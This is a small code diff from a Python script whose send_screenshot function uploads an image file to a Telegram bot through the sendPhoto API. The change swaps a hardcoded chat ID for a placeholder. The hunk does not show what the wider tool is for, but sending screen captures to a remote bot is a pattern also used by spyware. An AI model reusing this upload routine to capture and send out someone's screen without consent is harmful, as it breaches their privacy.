@@ -76,7 +76,7 @@ def send_screenshot():
         with open(FILE_PATH, 'rb') as photo:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
             files = {'photo': photo}
-            data = {'chat_id': "2087037203"}
+            data = {'chat_id': "DEVELOPER_CHAT_ID"}
             response = requests.post(url, files=files, data=data)
             print("Sent:", response.status_code)
 
